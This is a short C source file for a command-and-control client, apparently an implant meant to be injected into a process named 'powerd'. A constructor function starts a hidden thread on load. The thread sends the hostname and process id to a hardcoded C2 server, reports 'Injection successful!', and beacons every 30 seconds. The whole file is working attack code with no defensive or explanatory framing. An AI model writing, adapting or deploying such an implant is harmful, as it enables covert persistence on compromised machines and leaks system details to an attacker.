// c2_agent_minimal.c - 最小化C2客户端
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define C2_HOST "192.168.245.162"
#define C2_PORT 8888

static int http_post(const char *path, const char *json) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return -1;
    
    struct sockaddr_in server = {0};
    server.sin_family = AF_INET;
    server.sin_port = htons(C2_PORT);
    inet_pton(AF_INET, C2_HOST, &server.sin_addr);
    
    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) < 0) {
        close(sock);
        return -1;
    }
    
    char req[2048];
    int len = snprintf(req, sizeof(req),
        "POST %s HTTP/1.1\r\n"
        "Host: %s:%d\r\n"
        "Content-Type: application/json\r\n"
        "Content-Length: %zu\r\n"
        "Connection: close\r\n\r\n%s",
        path, C2_HOST, C2_PORT, strlen(json), json);
    
    send(sock, req, len, 0);
    close(sock);
    return 0;
}

static void* c2_thread(void *arg) {
    char hostname[256] = {0};
    gethostname(hostname, sizeof(hostname)-1);
    
    char json[512];
    snprintf(json, sizeof(json),
        "{\"id\":\"pwn-%s-%d\",\"version\":\"16.0\","
        "\"proc\":\"powerd\",\"pid\":%d}", 
        hostname, getpid(), getpid());
    
    // Check-in
    http_post("/api/checkin", json);
    
    // Report success
    snprintf(json, sizeof(json), 
        "{\"id\":\"pwn-%s-%d\",\"result\":\"0\"}", 
        hostname, getpid());
    http_post("/api/report", json);
    
    // Send proof of life
    snprintf(json, sizeof(json),
        "{\"id\":\"pwn-%s-%d\",\"cmd_id\":\"_proof_of_life\","
        "\"output\":\"Injection successful!\"}", 
        hostname, getpid());
    http_post("/api/result", json);
    
    // Periodic check-in
    while (1) {
        sleep(30);
        snprintf(json, sizeof(json),
            "{\"id\":\"pwn-%s-%d\",\"version\":\"16.0\","
            "\"proc\":\"powerd\",\"pid\":%d}", 
            hostname, getpid(), getpid());
        http_post("/api/checkin", json);
    }
    
    return NULL;
}

__attribute__((constructor))
static void init(void) {
    pthread_t tid;
    pthread_create(&tid, NULL, c2_thread, NULL);
    pthread_detach(tid);
}
